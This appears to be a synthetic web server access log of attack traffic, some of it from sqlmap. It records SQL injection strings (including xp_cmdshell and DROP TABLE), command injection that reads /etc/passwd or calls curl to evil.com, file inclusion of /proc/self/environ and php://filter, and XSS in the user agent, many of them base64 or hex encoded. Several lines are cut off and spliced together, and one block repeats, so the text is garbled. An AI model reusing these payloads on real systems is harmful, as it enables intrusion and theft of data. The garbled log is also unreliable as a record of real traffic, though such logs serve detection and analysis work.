108.90.232.102 - - [19/Jul/2024:07:24:15 +0000] "PUT /view?file=/proc/self/environ HTTP/1.0" 200 2882 "-" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:24:21 +0000] "PUT /login?username=admin&password=JyBBTkQgU0xFRVAoNSktLQ== HTTP/1.1" 405 2633 "-" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:24:23 +0000] "PUT /login?username=admin&password=' OR '1'='1 HTTP/1.1" 403 1879 "-" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:24:20 +0000] "POST /login?username=admin&password=JyBPUiAnMSc9JzE= HTTP/2.0" 404 547 "-" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:24:20 +0000] "PUT /view?file=7068703a2f2f66696c7465722f636f6e766572742e6261736536342d656e636f64652f7265736f757263653d696e6465782e706870 HTTP/1.1" 500 2567 "-" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:24:26 +0000] "POST /view?file=php://filter/convert.base64-encode/resource=index.php HTTP/1.1" 400 3712 "http://evil.com" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:24:21 +0000] "PUT /view?file=php://filter/convert.base64-encode/resource=index.php HTTP/1.0" 403 3575 "http://evil.com" "sqlmap/1.4.12.1#dev"

251.168.224.224 - - [05/Jun/2024:10:00:04 +0000] "DELETE /run?cmd=| cat /etc/passwd HTTP/1.1" 500 979 "-" "<script>alert('UA')</scrip251.168.224.224 - - [05/Jun/2024:09:59:50 +0000] "POST /run?cmd=;ls -la HTTP/2.0" 403 641 "-" "<script>alert('UA')</script>"
251.168.224.224 - - [05/Jun/2024:09:59:54 +0000] "POST /run?cmd=| curl http://evil.com HTTP/1.0" 404 878 "-" "<script>alert('UA')</script>"
251.168.224.224 - - [05/Jun/2024:10:00:03 +0000] "DELETE /run?cmd=26262077686f616d69 HTTP/1.0" 404 3393 "-" "<script>alert('UA')</script>"
251.168.224.224 - - [05/Jun/2024:09:59:50 +0000] "PATCH /run?cmd=| curl http://evil.com HTTP/2.0" 200 942 "-" "<script>alert('UA')</script>"
251.168.224.224 - - [05/Jun/2024:09:59:57 +0000] "PATCH /run?cmd=%2560id%2560 HTTP/2.0" 500 541 "-" "<script>alert('UA')</script>"
251.168.224.224 - - [05/Jun/2024:10:00:06 +0000] "PUT /run?cmd=$(sleep 5) HTTP/1.0" 500 1229 "-" "<script>alert('UA')</script>"
251.168.224.224 - - [05/Jun/2024:09:59:53 +0000] "PUT /run?cmd=$(sleep 5) HTTP/2.0" 500 1099 "-" "<script>alert('UA')</script>"
251.168.224.224 - - [05/Jun/2024:10:00:00 +0000] "PATCH /run?cmd=7c206375726c20687474703a2f2f6576696c2e636f6d HTTP/1.1" 405 1733 "-" "<script>alert('UA')</script>"
251.168.224.224 - - [05/Jun/2024:09:59:59 +0000] "GET /run?cmd=`id` HTTP/1.1" 499 4083 "-" "<script>alert('UA')</script>"
251.168.224.224 - - [05/Jun/2024:09:59:58 +0000] "POST /run?cmd=7c20636174202f6574632f706173737764 HTTP/1.1" 500 774 "-" "<script>alert('UA')</script>"
251.168.224.224 - - [05/Jun/2024:09:59:56 +0000] "GET /run?cmd=2428736c656570203529 HTTP/2.0" 405 1933 "-" "<script>alert('UA')</script>"
251.168.224.224 - - [05/Jun/2024:10:00:10 +0000] "GET /run?cmd=| curl http://evil.com HTTP/2.0" 400 391 "-" "<script>alert('UA')</script>"
251.168.224.224 - - [05/Jun/2024:10:00:18 +0000] "PATCH /run?cmd=| cat /etc/passwd HTTP/1.1" 200 1535 "http://evil.com" "<script>alert('UA')</script>"
211.142.167.88 - - [27/Oct/2024:04:00:48 +0000] "DELETE /login?username=admin&password='; EXEC xp_cmdshell('whoami');-- HTTP/2.0" 200 2098 "-" "<script>alert('UA')</script>"
211.142.167.88 - - [27/Oct/2024:04:00:23 +0000] "POST /run?cmd=$(sleep 5) HTTP/2.0" 500 2673 "-" "<script>alert('UA')</script>"
211.142.167.88 - - [27/Oct/2024:04:00:54 +0000] "PUT /debug HTTP/1.0" 200 302 "-" "<script>alert('UA')</script>"
211.142.167.88 - - [27/Oct/2024:04:00:29 +0000] PATCH /run?cmd=&& whoami HTTP/2.0 200 2048 - <script>alert('UA')</script>
211.142.167.88 - - [27/Oct/2024:04:00:26 +0000] "POST /view?file=php://filter/convert.base64-encode/resource=index.php HTTP/1.0" 404 767 "-" "<script>alert('UA')</script>"
211.142.167.88 - - [27/Oct/2024:04:00:50 +0000] "PUT /run?cmd=%257C%2520curl%2520http%253A//evil.com HTTP/2.0" 403 3236 "-" "<script>alert('UA')</script>"
211.142.167.88 - - [27/Oct/2024:04:00:51 +0000] "PUT /view?file=php://filter/convert.base64-encode/resource=index.php HTTP/2.0" 200 1094 "-" "<script>alert('UA')</script>"
211.142.167.88 - - [27/Oct/2024:04:00:59 +0000] "GET /debug HTTP/1.1" 405 2008 "http://evil.com" "<script>alert('UA')</script>"
211.142.167.88 - - [27/Oct/2024:04:00:32 +0000] "PATCH /run?cmd=O2xzIC1sYQ== HTTP/2.0" 400 379 "-" "<script>alert('UA')</scrip211.142.167.88 - - [27/Oct/2024:04:00:49 +0000] "GET /view?file=/proc/self/environ HTTP/1.0" 404 3037 "-" "<script>alert('UA')</script>"
211.142.167.88 - - [27/Oct/2024:04:00:47 +0000] "PUT /login?username=admin&password=JzsgRFJPUCBUQUJMRSB1c2VyczstLQ== HTTP/2.0" 500 3994 "-" "<script>alert('UA')</script>"
211.142.167.88 - - [27/Oct/2024:04:01:04 +0000] "DELETE /debug HTTP/2.0" 403 1891 "-" "<script>alert('UA')</script>"
211.142.167.88 - - [27/Oct/2024:04:01:05 +0000] "PUT /login?username=admin&password=admin' -- HTTP/2.0" 500 2174 "-" "<script>alert('UA')</script>"
108.90.232.102 - - [19/Jul/2024:07:23:45 +0000] "DELETE /view?file=L3Byb2Mvc2VsZi9lbnZpcm9u HTTP/1.1" 200 2240 "-" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:23:41 +0000] "PUT /view?file=cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT1pbmRleC5waHA= HTTP/1.0" 200 3270 "-" "sqlmap/1.4.12.108.90.232.102 - - [19/Jul/2024:07:23:46 +0000] "PUT /login?username=admin&password=%2527%2520UNION%2520SELECT%2520NULL%252CNULL-- HTTP/2.0" 500 1624 "-" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:23:49 +0000] "DELETE /login?username=admin&password=' OR '1'='1 HTTP/1.1" 405 2333 "-" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:23:49 +0000] "DELETE /login?username=admin&password=JzsgRVhFQyB4cF9jbWRzaGVsbCgnd2hvYW1pJyk7LS0= HTTP/1.0" 403 1949 "-" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:23:46 +0000] "PATCH /view?file=/proc/self/environ HTTP/2.0" 400 1301 "-" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:23:45 +0000] "PATCH /view?file=php://filter/convert.base64-encode/resource=index.php HTTP/1.1" 200 3791 "-" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:23:45 +0000] "PATCH /login?username=admin&password=J3x8JzEnPT0nMQ== HTTP/2.0" 400 570 "-" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:23:50 +0000] "PUT /view?file=php%253A//filter/convert.base64-encode/resource%253Dindex.php HTTP/2.0" 500 743 "-" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:23:47 +0000] "PATCH /view?file=/proc/self/environ HTTP/1.0" 200 3626 "-" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:23:52 +0000] "POST /view?file=2f6574632f706173737764 HTTP/1.0" 403 2366 "-" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:23:53 +0000] "PATCH /view?file=7068703a2f2f66696c7465722f636f6e766572742e6261736536342d656e636f64652f7265736f757263653d696e6465782e706870 HTTP/2.0" 400 373 "-" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:23:52 +0000] "POST /view?file=/proc/self/environ HTTP/1.0" 404 1776 "-" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:23:51 +0000] "PUT /view?file=php%253A//filter/convert.base64-encode/resource%253Dindex.php HTTP/1.0" 403 3053 "-" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:23:54 +0000] "POST /view?file=/etc/passwd HTTP/1.1" 500 97 "-" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:23:52 +0000] "PATCH /login?username=admin&password=273b2044524f50205441424c452075736572733b2d2d HTTP/1.0" 405 935 "-" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:24:01 +0000] "POST /view?file=2f70726f632f73656c662f656e7669726f6e HTTP/2.0" 200 138 "-" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:23:55 +0000] "PATCH /view?file=L2V0Yy9wYXNzd2Q= HTTP/1.0" 200 2468 "-" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:24:01 +0000] "DELETE /login?username=admin&password=277c7c2731273d3d2731 HTTP/2.0" 404 789 "-" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:24:05 +0000] "GET /login?username=admin&password=' AND SLEEP(5)-- HTTP/1.1" 200 2649 "-" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:24:00 +0000] "GET /view?file=L2V0Yy9wYXNzd2Q= HTTP/1.1" 500 3285 "-" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:24:05 +0000] "DELETE /login?username=admin&password=' AND SLEEP(5)-- HTTP/2.0" 200 509 "-" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:24:08 +0000] "PATCH /login?username=admin&password=' OR '1'='1 HTTP/1.1" 500 1323 "-" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:24:02 +0000] "DELETE /view?file=/proc/self/environ HTTP/2.0" 405 1551 "-" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:24:01 +0000] "POST /login?username=admin&password=admin%2527%2520-- HTTP/1.1" 404 679 "-" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:24:10 +0000] "POST /login?username=admin&password=2720554e494f4e2053454c454354204e554c4c2c4e554c4c2d2d HTTP/2.0" 404 2988 "-" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:24:09 +0000] "DELETE /view?file=2f70726f632f73656c662f656e7669726f6e HTTP/1.0" 200 1741 "-" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:24:04 +0000] "PATCH /login?username=admin&password=JyBBTkQgU0xFRVAoNSktLQ== HTTP/1.1" 400 2085 "-" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:24:09 +0000] "DELETE /view?file=/proc/self/environ HTTP/1.0" 200 3342 "-" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:24:12 +0000] "POST /view?file=L2V0Yy9wYXNzd2Q= HTTP/2.0" 200 3633 "-" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:24:09 +0000] "POST /view?file=/etc/passwd HTTP/1.0" 403 2408 "http://evil.com" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:24:08 +0000] "DELETE /login?username=admin&password=admin%2527%2520-- HTTP/2.0" 200 2885 "-" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:24:18 +0000] "GET /login?username=admin&password=2720414e4420534c4545502835292d2d HTTP/2.0" 500 2062 "-" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:24:19 +0000] "POST /view?file=2f70726f632f73656c662f656e7669726f6e HTTP/1.1" 200 3369 "-" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:24:16 +0000] "PATCH /view?file=2f6574632f706173737764 HTTP/1.0" 400 286 "-" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:24:20 +0000] "PATCH /login?username=admin&password=%2527%253B%2520EXEC%2520xp_cmdshell%2528%2527whoami%2527%2529%253B-- HTTP/1.1" 500 2957 "-" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:24:22 +0000] "DELETE /login?username=admin&password=JzsgRFJPUCBUQUJMRSB1c2VyczstLQ== HTTP/1.1" 500 3135 "-" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:24:19 +0000] "PATCH /view?file=/etc/passwd HTTP/2.0" 400 50 "http://evil.com" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:24:15 +0000] "PUT /view?file=/proc/self/environ HTTP/1.0" 200 2882 "-" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:24:21 +0000] "PUT /login?username=admin&password=JyBBTkQgU0xFRVAoNSktLQ== HTTP/1.1" 405 2633 "-" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:24:23 +0000] "PUT /login?username=admin&password=' OR '1'='1 HTTP/1.1" 403 1879 "-" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:24:20 +0000] "POST /login?username=admin&password=JyBPUiAnMSc9JzE= HTTP/2.0" 404 547 "-" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:24:20 +0000] "PUT /view?file=7068703a2f2f66696c7465722f636f6e766572742e6261736536342d656e636f64652f7265736f757263653d696e6465782e706870 HTTP/1.1" 500 2567 "-" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:24:26 +0000] "POST /view?file=php://filter/convert.base64-encode/resource=index.php HTTP/1.1" 400 3712 "http://evil.com" "sqlmap/1.4.12.1#dev"
108.90.232.102 - - [19/Jul/2024:07:24:21 +0000] "PUT /view?file=php://filter/convert.base64-encode/resource=index.php HTTP/1.0" 403 3575 "http://evil.com" "sqlmap/1.4.12.1#dev"
